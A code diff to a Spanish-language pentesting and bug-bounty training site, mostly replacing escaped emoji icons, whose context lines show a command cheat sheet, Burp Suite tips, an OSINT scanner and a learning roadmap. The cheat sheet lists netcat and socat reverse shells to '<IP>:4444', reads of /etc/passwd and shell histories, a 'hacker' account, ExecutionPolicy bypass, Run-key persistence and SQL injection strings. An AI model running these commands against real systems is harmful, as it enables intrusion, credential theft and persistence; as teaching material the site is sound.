@@ -6678,7 +6678,7 @@ var OS='bash', hist=[], hIdx=-1, activeCat=null;
 var DATA = {
 bash:{
  cats:[
- { id:'recon', icon:'\u1F50D', label:'Reconocimiento inicial',
+ { id:'recon', icon:'🔍', label:'Reconocimiento inicial',
  cmds:[
   {c:'whoami',d:'Usuario actual'},
   {c:'id',d:'UID, GID y grupos del usuario'},
@@ -6702,7 +6702,7 @@ bash:{
   {c:'w',d:'Qu\u00E9 hace cada usuario conectado'},
  ]
  },
- { id:'users', icon:'\u1F464', label:'Usuarios y grupos',
+ { id:'users', icon:'👤', label:'Usuarios y grupos',
  cmds:[
   {c:'cat /etc/passwd',d:'Lista de usuarios del sistema'},
   {c:'cat /etc/passwd | cut -d: -f1',d:'Solo los nombres de usuario'},
@@ -6724,7 +6724,7 @@ bash:{
   {c:'find / -name ".bash_history" 2>/dev/null',d:'Buscar historiales de todos los usuarios'},
  ]
  },
- { id:'net', icon:'\u1F310', label:'Red y conectividad',
+ { id:'net', icon:'🌐', label:'Red y conectividad',
  cmds:[
   {c:'ip addr',d:'Interfaces de red y sus IPs'},
   {c:'ip addr show eth0',d:'Info de la interfaz eth0'},
@@ -6782,7 +6782,7 @@ bash:{
   {c:'systemctl list-timers',d:'Timers de systemd'},
  ]
  },
- { id:'files', icon:'\u1F4C1', label:'Archivos y directorios',
+ { id:'files', icon:'📁', label:'Archivos y directorios',
  cmds:[
   {c:'ls -la',d:'Listar con permisos, due\u00F1o y tama\u00F1o'},
   {c:'ls -lah',d:'Igual pero con tama\u00F1os legibles'},
@@ -6843,7 +6843,7 @@ bash:{
   {c:'script /dev/null -c bash',d:'Otra forma de conseguir TTY'},
  ]
  },
- { id:'nmap', icon:'\u1F5FA\uFE0F', label:'Nmap',
+ { id:'nmap', icon:'🗺\uFE0F', label:'Nmap',
  cmds:[
   {c:'nmap -sV -sC <IP>',d:'Detecci\u00F3n de versiones + scripts por defecto'},
   {c:'nmap -p- <IP>',d:'Escanear TODOS los 65535 puertos'},
@@ -6876,7 +6876,7 @@ bash:{
   {c:'nmap -v <IP>',d:'Verbose \u2014 m\u00E1s detalles durante el scan'},
  ]
  },
- { id:'web', icon:'\u1F577\uFE0F', label:'Enumeraci\u00F3n Web',
+ { id:'web', icon:'🕷\uFE0F', label:'Enumeraci\u00F3n Web',
  cmds:[
   {c:'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt',d:'Fuerza bruta de directorios'},
   {c:'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',d:'Wordlist mediana de directorios'},
@@ -6903,7 +6903,7 @@ bash:{
   {c:'wafw00f http://<IP>',d:'Detectar WAF (Web Application Firewall)'},
  ]
  },
- { id:'sql', icon:'\u1F5C4\uFE0F', label:'SQLMap',
+ { id:'sql', icon:'🗄\uFE0F', label:'SQLMap',
  cmds:[
   {c:'sqlmap -u "http://<IP>/page?id=1" --dbs',d:'Listar bases de datos'},
   {c:'sqlmap -u "http://<IP>/page?id=1" -D <DB> --tables',d:'Listar tablas de una BD'},
@@ -6929,7 +6929,7 @@ bash:{
   {c:'sqlmap -u "http://<IP>/page?id=1" --proxy=http://127.0.0.1:8080',d:'A trav\u00E9s de Burp proxy'},
  ]
  },
- { id:'crack', icon:'\u1F513', label:'Contrase\u00F1as y hashes',
+ { id:'crack', icon:'🔓', label:'Contrase\u00F1as y hashes',
  cmds:[
   {c:'john hash.txt',d:'Crackear hash con John The Ripper'},
   {c:'john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt',d:'Con diccionario rockyou'},
@@ -6960,7 +6960,7 @@ bash:{
   {c:'echo "texto" | base64',d:'Codificar en base64'},
  ]
  },
- { id:'shells', icon:'\u1F4BB', label:'Shells y payloads',
+ { id:'shells', icon:'💻', label:'Shells y payloads',
  cmds:[
   {c:'nc -lvnp 4444',d:'Netcat \u2014 escuchar en el puerto 4444'},
   {c:'nc -e /bin/bash <IP> 4444',d:'Netcat \u2014 reverse shell (si tiene -e)'},
@@ -6986,7 +6986,7 @@ bash:{
   {c:'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:<IP>:4444',d:'Socat \u2014 reverse shell con TTY'},
  ]
  },
- { id:'transfer', icon:'\u1F4E4', label:'Transferencia de archivos',
+ { id:'transfer', icon:'📤', label:'Transferencia de archivos',
  cmds:[
   {c:'python3 -m http.server 8080',d:'Servidor HTTP en el puerto 8080'},
   {c:'python -m SimpleHTTPServer 8080',d:'Servidor HTTP Python 2'},
@@ -7008,7 +7008,7 @@ bash:{
   {c:'impacket-smbserver share /tmp -smb2support -user tu -password tu',d:'SMB con autenticaci\u00F3n'},
  ]
  },
- { id:'post', icon:'\u1F3AF', label:'Post-explotaci\u00F3n Linux',
+ { id:'post', icon:'🎯', label:'Post-explotaci\u00F3n Linux',
  cmds:[
   {c:'cat /root/root.txt',d:'Flag de root (CTF)'},
   {c:'cat /home/*/user.txt',d:'Flag de usuario (CTF)'},
@@ -7034,7 +7034,7 @@ bash:{
 },
 cmd:{
  cats:[
- { id:'recon', icon:'\u1F50D', label:'Reconocimiento',
+ { id:'recon', icon:'🔍', label:'Reconocimiento',
  cmds:[
   {c:'whoami',d:'Usuario actual'},
   {c:'whoami /all',d:'Usuario, SID, grupos y privilegios completos'},
@@ -7059,7 +7059,7 @@ cmd:{
   {c:'wmic computersystem get name,domain,manufacturer',d:'Info del equipo'},
  ]
  },
- { id:'users', icon:'\u1F464', label:'Usuarios y grupos',
+ { id:'users', icon:'👤', label:'Usuarios y grupos',
  cmds:[
   {c:'net user',d:'Lista de usuarios locales'},
   {c:'net user <usuario>',d:'Detalles de un usuario espec\u00EDfico'},
@@ -7075,7 +7075,7 @@ cmd:{
   {c:'query session',d:'Sesiones activas (RDP, etc.)'},
  ]
  },
- { id:'net', icon:'\u1F310', label:'Red y conectividad',
+ { id:'net', icon:'🌐', label:'Red y conectividad',
  cmds:[
   {c:'ipconfig',d:'Info b\u00E1sica de red'},
   {c:'ipconfig /all',d:'Info completa: MAC, DNS, DHCP, etc.'},
@@ -7103,7 +7103,7 @@ cmd:{
   {c:'type C:\\Windows\\System32\\drivers\\etc\\hosts',d:'Archivo hosts del sistema'},
  ]
  },
- { id:'files', icon:'\u1F4C1', label:'Archivos y directorios',
+ { id:'files', icon:'📁', label:'Archivos y directorios',
  cmds:[
   {c:'dir',d:'Listar directorio actual'},
   {c:'dir /a',d:'Listar incluyendo archivos ocultos'},
@@ -7157,7 +7157,7 @@ cmd:{
   {c:'net user hacker /active:yes',d:'Activar cuenta desactivada'},
  ]
  },
- { id:'registry', icon:'\u1F4DD', label:'Registro de Windows',
+ { id:'registry', icon:'📝', label:'Registro de Windows',
  cmds:[
   {c:'reg query HKLM',d:'Listar claves en HKLM'},
   {c:'reg query HKCU',d:'Listar claves en HKCU'},
@@ -7177,7 +7177,7 @@ cmd:{
 },
 ps:{
  cats:[
- { id:'recon', icon:'\u1F50D', label:'Reconocimiento',
+ { id:'recon', icon:'🔍', label:'Reconocimiento',
  cmds:[
   {c:'whoami',d:'Usuario actual'},
   {c:'whoami /all',d:'Info completa del token: SID, grupos, privilegios'},
@@ -7199,7 +7199,7 @@ ps:{
   {c:'Get-ExecutionPolicy -List',d:'Pol\u00EDticas de ejecuci\u00F3n por scope'},
  ]
  },
- { id:'users', icon:'\u1F464', label:'Usuarios y grupos',
+ { id:'users', icon:'👤', label:'Usuarios y grupos',
  cmds:[
   {c:'Get-LocalUser',d:'Usuarios locales con estado y descripci\u00F3n'},
   {c:'Get-LocalUser | Select Name,Enabled,LastLogon,PasswordRequired',d:'Info clave de usuarios'},
@@ -7215,7 +7215,7 @@ ps:{
   {c:'(Get-ADUser $env:USERNAME -Properties MemberOf).MemberOf',d:'Grupos del usuario actual en AD'},
  ]
  },
- { id:'net', icon:'\u1F310', label:'Red',
+ { id:'net', icon:'🌐', label:'Red',
  cmds:[
   {c:'Get-NetIPAddress',d:'Todas las IPs del equipo'},
   {c:'Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4"}',d:'Solo IPs IPv4'},
@@ -7252,7 +7252,7 @@ ps:{
   {c:'.\\PowerUp.ps1; Invoke-AllChecks',d:'PowerUp \u2014 checks autom\u00E1ticos de privesc'},
  ]
  },
- { id:'bypass', icon:'\u1F6E1\uFE0F', label:'Bypass y evasi\u00F3n',
+ { id:'bypass', icon:'🛡\uFE0F', label:'Bypass y evasi\u00F3n',
  cmds:[
   {c:'Get-ExecutionPolicy',d:'Ver pol\u00EDtica actual'},
   {c:'Set-ExecutionPolicy Bypass -Scope Process -Force',d:'Bypass de ExecutionPolicy en el proceso actual'},
@@ -7285,7 +7285,7 @@ ps:{
   {c:'Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value "*" -Force',d:'Confiar en todos los hosts (lab)'},
  ]
  },
- { id:'persist', icon:'\u1F512', label:'Persistencia',
+ { id:'persist', icon:'🔒', label:'Persistencia',
  cmds:[
   {c:'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\Temp\\shell.exe" -PropertyType String',d:'Persistencia en Run key del usuario'},
   {c:'New-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\shell.exe" -PropertyType String',d:'Persistencia en Run key del sistema (requiere admin)'},
@@ -7544,7 +7544,7 @@ var grid=document.getElementById('burp-grid');
 if(!grid) return;
 
 var BURP=[
- { icon:'\u1F504', title:'Proxy / Intercept', tag:'CORE',
+ { icon:'🔄', title:'Proxy / Intercept', tag:'CORE',
  items:[
  {k:'Activar intercept',v:'Proxy \u2192 Intercept \u2192 Intercept is ON'},
  {k:'Forward request',v:'Reenviar la petici\u00F3n interceptada'},
@@ -7560,7 +7560,7 @@ var BURP=[
  {k:'Upstream proxy',v:'Cadena de proxies: Burp \u2192 SOCKS \u2192 Tor'},
  ]
  },
- { icon:'\u1F501', title:'Repeater', tag:'ESENCIAL',
+ { icon:'🔁', title:'Repeater', tag:'ESENCIAL',
  items:[
  {k:'Abrir en Repeater',v:'Ctrl+R (desde cualquier petici\u00F3n)'},
  {k:'Enviar request',v:'Ctrl+Enter \u2014 enviar y ver respuesta'},
@@ -7576,7 +7576,7 @@ var BURP=[
  {k:'Send to Intruder',v:'Ctrl+I \u2014 enviar al Intruder para fuzzing'},
  ]
  },
- { icon:'\u1F489', title:'Intruder', tag:'FUZZING',
+ { icon:'💉', title:'Intruder', tag:'FUZZING',
  items:[
  {k:'Sniper',v:'Un payload set, una posici\u00F3n a la vez'},
  {k:'Battering ram',v:'Un payload set, todas las posiciones iguales'},
@@ -7595,7 +7595,7 @@ var BURP=[
  {k:'Wordlists comunes',v:'/usr/share/wordlists/ \u2014 SecLists en GitHub'},
  ]
  },
- { icon:'\u1F50D', title:'Scanner / Active Scan', tag:'PRO',
+ { icon:'🔍', title:'Scanner / Active Scan', tag:'PRO',
  items:[
  {k:'Escanear en scope',v:'Dashboard \u2192 New scan \u2192 Crawl and Audit'},
  {k:'Scan request espec\u00EDfico',v:'Click derecho \u2192 Do active scan'},
@@ -7610,7 +7610,7 @@ var BURP=[
  {k:'Scan check JS',v:'Activa el an\u00E1lisis est\u00E1tico de JavaScript'},
  ]
  },
- { icon:'\u1F513', title:'Decoder / Encoder', tag:'UTIL',
+ { icon:'🔓', title:'Decoder / Encoder', tag:'UTIL',
  items:[
  {k:'Abrir Decoder',v:'Ctrl+Shift+D o Decoder tab'},
  {k:'URL encode',v:'Encode as \u2192 URL para params en GET/POST'},
@@ -7625,7 +7625,7 @@ var BURP=[
  {k:'Encadenar',v:'Decoder \u2192 Decode (B64) \u2192 Encode (URL) \u2014 m\u00FAltiple'},
  ]
  },
- { icon:'\u1F575\uFE0F', title:'Target / Site Map', tag:'RECON',
+ { icon:'🕵\uFE0F', title:'Target / Site Map', tag:'RECON',
  items:[
  {k:'Scope \u2014 Add',v:'Target \u2192 Scope \u2192 Add \u2014 definir el objetivo'},
  {k:'Scope URL regex',v:'Usar regex para URLs complejas'},
@@ -7657,7 +7657,7 @@ var BURP=[
  {k:'Ctrl+T',v:'Intercept on/off'},
  ]
  },
- { icon:'\u1F3AF', title:'T\u00E9cnicas de explotaci\u00F3n', tag:'PENTEST',
+ { icon:'🎯', title:'T\u00E9cnicas de explotaci\u00F3n', tag:'PENTEST',
  items:[
  {k:'SQLi manual',v:'Repeater \u2192 modificar param \u2192 \'--+   OR 1=1--'},
  {k:'XSS reflected',v:'Insertar payload en param \u2192 verificar reflejo HTML'},
@@ -7676,7 +7676,7 @@ var BURP=[
  {k:'Rate limit bypass',v:'X-Forwarded-For: IP diferente en cada request (Intruder)'},
  ]
  },
- { icon:'\u1F50C', title:'Extensiones \u00FAtiles (BApp Store)', tag:'PLUGINS',
+ { icon:'🔌', title:'Extensiones \u00FAtiles (BApp Store)', tag:'PLUGINS',
  items:[
  {k:'Turbo Intruder',v:'Intruder con Python \u2014 miles de requests/s'},
  {k:'Autorize',v:'Detectar broken access control autom\u00E1ticamente'},
@@ -7692,7 +7692,7 @@ var BURP=[
  {k:'InQL (GraphQL)',v:'Enumerar y testear APIs GraphQL'},
  ]
  },
- { icon:'\u1F4CB', title:'Workflows de pentesting web', tag:'WORKFLOW',
+ { icon:'📋', title:'Workflows de pentesting web', tag:'WORKFLOW',
  items:[
  {k:'1. Recon pasivo',v:'Spider/Crawl \u2192 Site map \u2192 comentarios, JS files, APIs'},
  {k:'2. Mapear endpoints',v:'HTTP history \u2192 filtrar por scope \u2192 ordenar por tipo'},
@@ -8109,18 +8109,18 @@ document.querySelectorAll('.rce-ex').forEach(function(el){
 
 /* \u2550\u2550\u2550 FUENTES DE INTELIGENCIA \u2550\u2550\u2550 */
 var SOURCES = [
- { id:'whois',     label:'WHOIS',          icon:'\u1F4CB' },
- { id:'dns',       label:'DNS Records',    icon:'\u1F310' },
- { id:'subdomains',label:'Subdomains',     icon:'\u1F50D' },
- { id:'certs',     label:'SSL Certs',      icon:'\u1F512' },
- { id:'reverseip', label:'Reverse IP',     icon:'\u1F504' },
- { id:'headers',   label:'HTTP Headers',   icon:'\u1F4E1' },
- { id:'otx',       label:'OTX Threat',     icon:'\u1F6E1\uFE0F' },
- { id:'otx_urls',  label:'URLs Indexadas', icon:'\u1F517' },
- { id:'otx_dns',   label:'Passive DNS',    icon:'\u1F4CA' },
+ { id:'whois',     label:'WHOIS',          icon:'📋' },
+ { id:'dns',       label:'DNS Records',    icon:'🌐' },
+ { id:'subdomains',label:'Subdomains',     icon:'🔍' },
+ { id:'certs',     label:'SSL Certs',      icon:'🔒' },
+ { id:'reverseip', label:'Reverse IP',     icon:'🔄' },
+ { id:'headers',   label:'HTTP Headers',   icon:'📡' },
+ { id:'otx',       label:'OTX Threat',     icon:'🛡\uFE0F' },
+ { id:'otx_urls',  label:'URLs Indexadas', icon:'🔗' },
+ { id:'otx_dns',   label:'Passive DNS',    icon:'📊' },
  { id:'wayback',   label:'Wayback Machine',icon:'\u23F1\uFE0F' },
- { id:'urlscan',   label:'URLScan.io',     icon:'\u1F50E' },
- { id:'geoip',     label:'GeoIP',          icon:'\u1F5FA\uFE0F' },
+ { id:'urlscan',   label:'URLScan.io',     icon:'🔎' },
+ { id:'geoip',     label:'GeoIP',          icon:'🗺\uFE0F' },
 ];
 
 var srcStatus = {};
@@ -8207,7 +8207,7 @@ function scanWHOIS(target){
   }
  });
  if(!html) html = '<div class="rce-empty">Sin datos WHOIS disponibles</div>';
- addCard('\u1F4CB','WHOIS', null, html, 'whois');
+ addCard('📋','WHOIS', null, html, 'whois');
  setSourceStatus('whois','done');
  }).catch(function(){ setSourceStatus('whois','error'); });
 }
@@ -8228,7 +8228,7 @@ function scanDNS(target){
   return row(type, val || parts.slice(1).join(' '));
  }).join('');
  if(!html) html = '<div class="rce-empty">Sin registros DNS</div>';
- addCard('\u1F310','DNS Records', lines.length+' registros', html, 'dns');
+ addCard('🌐','DNS Records', lines.length+' registros', html, 'dns');
  setSourceStatus('dns','done');
  }).catch(function(){ setSourceStatus('dns','error'); });
 }
@@ -8245,14 +8245,14 @@ function scanSubdomains(target){
  }).map(function(s){ return s.trim().replace(/^\*\./,''); })
   .filter(function(s){ return s.includes('.') && s.endsWith(domain); })
  )].sort().slice(0,60);
- addCard('\u1F50D','Subdomains', subs.length+' encontrados', tags(subs), 'subdomains');
+ addCard('🔍','Subdomains', subs.length+' encontrados', tags(subs), 'subdomains');
  setSourceStatus('subdomains','done');
  }).catch(function(){
  /* Fallback: HackerTarget hostsearch */
  fetchTXT('https://api.hackertarget.com/hostsearch/?q='+encodeURIComponent(domain))
   .then(function(txt){
     var subs = txt.split('\n').filter(function(l){ return l.trim(); }).map(function(l){ return l.split(',')[0]; });
-    addCard('\u1F50D','Subdomains', subs.length+' encontrados', tags(subs), 'subdomains');
+    addCard('🔍','Subdomains', subs.length+' encontrados', tags(subs), 'subdomains');
     setSourceStatus('subdomains','done');
   }).catch(function(){ setSourceStatus('subdomains','error'); });
  });
@@ -8275,7 +8275,7 @@ function scanCerts(target){
   );
  }).join('');
  if(!html) html = '<div class="rce-empty">Sin certificados encontrados</div>';
- addCard('\u1F512','SSL Certificates', certs.length+' certs', html, 'certs');
+ addCard('🔒','SSL Certificates', certs.length+' certs', html, 'certs');
  setSourceStatus('certs','done');
  }).catch(function(){ setSourceStatus('certs','error'); });
 }
@@ -8288,7 +8288,7 @@ function scanReverseIP(target){
  .then(function(txt){
  if(txt.includes('error') || txt.includes('API count')) throw new Error();
  var hosts = txt.split('\n').filter(function(l){ return l.trim(); });
- addCard('\u1F504','Reverse IP', hosts.length+' hosts', tags(hosts.slice(0,40)), 'reverseip');
+ addCard('🔄','Reverse IP', hosts.length+' hosts', tags(hosts.slice(0,40)), 'reverseip');
  setSourceStatus('reverseip','done');
  }).catch(function(){ setSourceStatus('reverseip','error'); });
 }
@@ -8312,7 +8312,7 @@ function scanHeaders(target){
   return row(k.slice(0,22), (isSec?'<span style="color:#3ddc84">\u2713 </span>':'')+v);
  }).join('');
  if(!html) html = '<div class="rce-empty">Sin headers disponibles</div>';
- addCard('\u1F4E1','HTTP Headers', lines.length+' headers', html, 'headers');
+ addCard('📡','HTTP Headers', lines.length+' headers', html, 'headers');
  setSourceStatus('headers','done');
  }).catch(function(){ setSourceStatus('headers','error'); });
 }
@@ -8342,7 +8342,7 @@ function scanOTX(target){
     html += '<div style="font-family:var(--mono);font-size:10px;color:rgba(79,195,247,.7);margin-top:3px;word-break:break-all">'+r+'</div>';
   });
  }
- addCard('\u1F6E1\uFE0F','OTX Threat Intelligence', pulses+' pulsos', html, 'otx');
+ addCard('🛡\uFE0F','OTX Threat Intelligence', pulses+' pulsos', html, 'otx');
  setSourceStatus('otx','done');
  }).catch(function(){ setSourceStatus('otx','error'); });
 }
@@ -8357,7 +8357,7 @@ function scanOTXUrls(target){
  .then(function(d){
  var urls = (d.url_list || []).map(function(u){ return u.url; }).filter(Boolean);
  var html = urls.length ? tags(urls.slice(0,30)) : '<div class="rce-empty">Sin URLs indexadas</div>';
- addCard('\u1F517','URLs Indexadas (OTX)', urls.length+' URLs', html, 'otx_urls');
+ addCard('🔗','URLs Indexadas (OTX)', urls.length+' URLs', html, 'otx_urls');
  setSourceStatus('otx_urls','done');
  }).catch(function(){ setSourceStatus('otx_urls','error'); });
 }
@@ -8375,7 +8375,7 @@ function scanPassiveDNS(target){
   return row(r.record_type||'?', (r.hostname||r.address||'?') + ' \u2192 ' + (r.address||r.hostname||'?') + (r.last ? ' ['+r.last.slice(0,10)+']' : ''));
  }).join('');
  if(!html) html = '<div class="rce-empty">Sin registros Passive DNS</div>';
- addCard('\u1F4CA','Passive DNS', recs.length+' registros', html, 'otx_dns');
+ addCard('📊','Passive DNS', recs.length+' registros', html, 'otx_dns');
  setSourceStatus('otx_dns','done');
  }).catch(function(){ setSourceStatus('otx_dns','error'); });
 }
@@ -8439,13 +8439,13 @@ function scanURLScan(target){
     + ' <span style="color:'+scoreColor+'"> [score:'+score+']</span>'
   );
  }).join('');
- addCard('\u1F50E','URLScan.io', results.length+' scans', html, 'urlscan');
+ addCard('🔎','URLScan.io', results.length+' scans', html, 'urlscan');
  setSourceStatus('urlscan','done');
  }).catch(function(){
  /* URLScan sin resultados */
  var html = '<div class="rce-empty">Sin scans previos en URLScan.io</div>'
   + '<div style="margin-top:12px"><a href="https://urlscan.io/search/#domain:'+encodeURIComponent(target)+'" target="_blank" style="font-family:var(--mono);font-size:11px;color:#4fc3f7">Ver en urlscan.io \u2192</a></div>';
- addCard('\u1F50E','URLScan.io', 'Sin datos', html, 'urlscan');
+ addCard('🔎','URLScan.io', 'Sin datos', html, 'urlscan');
  setSourceStatus('urlscan','done');
  });
 }
@@ -8481,7 +8481,7 @@ function scanGeoIP(target){
  if(d.hosting !== undefined) html += row('Hosting',  d.hosting ? '\u26A0 S\u00CD (datacenter)' : 'No');
  if(d.proxy !== undefined)   html += row('Proxy/VPN', d.proxy ? '\u26A0 Detectado' : 'No detectado');
  if(d.tor !== undefined)     html += row('Tor',      d.tor ? '\u26A0 Nodo Tor' : 'No');
- addCard('\u1F5FA\uFE0F','GeoIP + ASN', null, html, 'geoip');
+ addCard('🗺\uFE0F','GeoIP + ASN', null, html, 'geoip');
  setSourceStatus('geoip','done');
  }).catch(function(){ setSourceStatus('geoip','error'); });
 }
@@ -8518,7 +8518,7 @@ function scanShodan(target){
     body.innerHTML += html;
   }
  } else if(html) {
-  addCard('\u1F50D','Shodan InternetDB', d.ports ? d.ports.length+' puertos' : 'datos', html, 'shodan');
+  addCard('🔍','Shodan InternetDB', d.ports ? d.ports.length+' puertos' : 'datos', html, 'shodan');
  }
  }).catch(function(){}); // Silenciar \u2014 no cr\u00EDtico
 }
@@ -8840,7 +8840,7 @@ var timeline = document.getElementById('rdm-timeline');
 if(!timeline) return;
 
 var ROADMAP_PHASES = [
- { num:'00', color:'#9ab', label:'Fundamentos', icon:'\u1F9F1', time:'1-3 meses',
+ { num:'00', color:'#9ab', label:'Fundamentos', icon:'🧱', time:'1-3 meses',
  desc:'La base sin la que nada funciona. Sin esto, estar\u00E1s perdido en todo lo dem\u00E1s.',
  skills:[
  'Redes: TCP/IP, DNS, HTTP, OSI model',
@@ -8853,7 +8853,7 @@ var ROADMAP_PHASES = [
  resources:['OverTheWire: Bandit','TryHackMe: Pre-Security Path','Linux Journey (linuxjourney.com)','Python Crash Course (libro)','Professor Messer: CompTIA Network+'],
  cert:'(opcional) CompTIA Network+ o eJPT'
  },
- { num:'01', color:'#4fc3f7', label:'Pentesting Web', icon:'\u1F310', time:'3-6 meses',
+ { num:'01', color:'#4fc3f7', label:'Pentesting Web', icon:'🌐', time:'3-6 meses',
  desc:'El terreno de juego del bug bounty. Aprende c\u00F3mo funciona la web antes de atacarla.',
  skills:[
  'HTTP detallado: m\u00E9todos, headers, status codes, cookies',
@@ -8867,7 +8867,7 @@ var ROADMAP_PHASES = [
  resources:['PortSwigger Web Security Academy (GRATIS)','OWASP Testing Guide','PentesterLab','HackTheBox: Web challenges','Bug Bounty Bootcamp (libro)'],
  cert:'PortSwigger Burp Suite Certified Practitioner (BSCP)'
  },
- { num:'02', color:'#3ddc84', label:'Primeras Plataformas', icon:'\u1F3AF', time:'6-9 meses',
+ { num:'02', color:'#3ddc84', label:'Primeras Plataformas', icon:'🎯', time:'6-9 meses',
  desc:'Es hora de cazar bugs reales. Empieza con programas de bajo perfil y ve escalando.',
  skills:[
  'Reconocimiento: subfinder, amass, httpx, katana',
@@ -8896,7 +8896,7 @@ var ROADMAP_PHASES = [
  resources:['TCM Security cursos','Hack The Box Pro Labs','PNPT certification training','IppSec YouTube (HTB writeups)','0xdf writeups'],
  cert:'TCM Security PNPT o eWPTX'
  },
- { num:'04', color:'#ce93d8', label:'Especializaci\u00F3n', icon:'\u1F52C', time:'15-24 meses',
+ { num:'04', color:'#ce93d8', label:'Especializaci\u00F3n', icon:'🔬', time:'15-24 meses',
  desc:'Elige tu especialidad y dom\u00EDnala al 100%. Los mejores hackers son especialistas.',
  skills:[
  'Web avanzado: request smuggling, desync attacks, cache poisoning',
@@ -8910,7 +8910,7 @@ var ROADMAP_PHASES = [
  resources:['James Kettle (PortSwigger research)','HackTricks gitbook','PentesterLab Pro','CRTP / CRTE para AD','NahamSec twitch streams'],
  cert:'OSCP, OSWE, BSCP seg\u00FAn especialidad'
  },
- { num:'05', color:'#ff4d6a', label:'Profesional', icon:'\u1F480', time:'24+ meses',
+ { num:'05', color:'#ff4d6a', label:'Profesional', icon:'💀', time:'24+ meses',
  desc:'El nivel al que pocos llegan. Investigaci\u00F3n original, CVEs propios, Hall of Fame.',
  skills:[
  'Investigaci\u00F3n original: buscar nuevas clases de vulnerabilidades',
@@ -8952,7 +8952,7 @@ ROADMAP_PHASES.forEach(function(phase, i){
  + '<div class="rdm-skills">'+skillsHTML+'</div>'
  + '<div class="rdm-section-title">Recursos recomendados</div>'
  + '<div class="rdm-resources">'+resHTML+'</div>'
- + (phase.cert ? '<div class="rdm-cert">\u1F393 '+phase.cert+'</div>' : '')
+ + (phase.cert ? '<div class="rdm-cert">🎓 '+phase.cert+'</div>' : '')
  + '</div>';
 
  timeline.appendChild(el);
@@ -9236,7 +9236,7 @@ function makeCVECard(cve, delay){
  + (cve.name ? '<span class="cve-name">'+cve.name+'</span>' : '')
  + '<span class="cve-badge '+cve.sev+'">'+cve.sev+'</span>'
  + '<span class="cve-vendor-tag">'+cve.vendor+'</span>'
- + (cve.exploited ? '<span class="cve-exploited">\u1F534 EXPLOTADO</span>' : '')
+ + (cve.exploited ? '<span class="cve-exploited">🔴 EXPLOTADO</span>' : '')
  + '<span class="cve-date" style="margin-left:auto">'+cve.year+'</span>'
  + '</div>'
  + '<div class="cve-card-body">'
@@ -9441,41 +9441,41 @@ var L={
 
 /* \u2550\u2550 CIUDADES \u2550\u2550 */
 var CT=[
- {n:'New York',   cc:'\u1F1FA\u1F1F8',la:40.7, lo:-74.0, w:5},
- {n:'Los Angeles',cc:'\u1F1FA\u1F1F8',la:34.0, lo:-118.2,w:4},
- {n:'Chicago',    cc:'\u1F1FA\u1F1F8',la:41.8, lo:-87.6, w:3},
- {n:'Washington', cc:'\u1F1FA\u1F1F8',la:38.9, lo:-77.0, w:3},
- {n:'Toronto',    cc:'\u1F1E8\u1F1E6',la:43.7, lo:-79.4, w:3},
- {n:'Mexico City',cc:'\u1F1F2\u1F1FD',la:19.4, lo:-99.1, w:3},
- {n:'S\u00E3o Paulo',  cc:'\u1F1E7\u1F1F7',la:-23.5,lo:-46.6, w:4},
- {n:'Buenos Aires',cc:'\u1F1E6\u1F1F7',la:-34.6,lo:-58.4,w:3},
- {n:'Bogot\u00E1',     cc:'\u1F1E8\u1F1F4',la:4.7,  lo:-74.1, w:2},
- {n:'Santiago',   cc:'\u1F1E8\u1F1F1',la:-33.4,lo:-70.6, w:2},
- {n:'London',     cc:'\u1F1EC\u1F1E7',la:51.5, lo:-0.1,  w:5},
- {n:'Paris',      cc:'\u1F1EB\u1F1F7',la:48.8, lo:2.3,   w:4},
- {n:'Berlin',     cc:'\u1F1E9\u1F1EA',la:52.5, lo:13.4,  w:3},
- {n:'Moscow',     cc:'\u1F1F7\u1F1FA',la:55.7, lo:37.6,  w:5},
- {n:'Madrid',     cc:'\u1F1EA\u1F1F8',la:40.4, lo:-3.7,  w:3},
- {n:'Rome',       cc:'\u1F1EE\u1F1F9',la:41.9, lo:12.5,  w:3},
- {n:'Kyiv',       cc:'\u1F1FA\u1F1E6',la:50.4, lo:30.5,  w:2},
- {n:'Istanbul',   cc:'\u1F1F9\u1F1F7',la:41.0, lo:29.0,  w:3},
- {n:'Beijing',    cc:'\u1F1E8\u1F1F3',la:39.9, lo:116.4, w:5},
- {n:'Shanghai',   cc:'\u1F1E8\u1F1F3',la:31.2, lo:121.5, w:5},
- {n:'Tokyo',      cc:'\u1F1EF\u1F1F5',la:35.6, lo:139.7, w:5},
- {n:'Seoul',      cc:'\u1F1F0\u1F1F7',la:37.6, lo:126.9, w:4},
- {n:'Mumbai',     cc:'\u1F1EE\u1F1F3',la:19.0, lo:72.8,  w:4},
- {n:'Delhi',      cc:'\u1F1EE\u1F1F3',la:28.6, lo:77.2,  w:4},
- {n:'Singapore',  cc:'\u1F1F8\u1F1EC',la:1.3,  lo:103.8, w:4},
- {n:'Hong Kong',  cc:'\u1F1ED\u1F1F0',la:22.3, lo:114.2, w:4},
- {n:'Bangkok',    cc:'\u1F1F9\u1F1ED',la:13.7, lo:100.5, w:3},
- {n:'Jakarta',    cc:'\u1F1EE\u1F1E9',la:-6.2, lo:106.8, w:3},
- {n:'Pyongyang',  cc:'\u1F1F0\u1F1F5',la:39.0, lo:125.8, w:3},
- {n:'Tehran',     cc:'\u1F1EE\u1F1F7',la:35.7, lo:51.4,  w:3},
- {n:'Dubai',      cc:'\u1F1E6\u1F1EA',la:25.2, lo:55.3,  w:3},
- {n:'Cairo',      cc:'\u1F1EA\u1F1EC',la:30.0, lo:31.2,  w:3},
- {n:'Lagos',      cc:'\u1F1F3\u1F1EC',la:6.5,  lo:3.4,   w:3},
- {n:'Sydney',     cc:'\u1F1E6\u1F1FA',la:-33.8,lo:151.2, w:3},
- {n:'Nairobi',    cc:'\u1F1F0\u1F1EA',la:-1.3, lo:36.8,  w:2},
+ {n:'New York',   cc:'🇺🇸',la:40.7, lo:-74.0, w:5},
+ {n:'Los Angeles',cc:'🇺🇸',la:34.0, lo:-118.2,w:4},
+ {n:'Chicago',    cc:'🇺🇸',la:41.8, lo:-87.6, w:3},
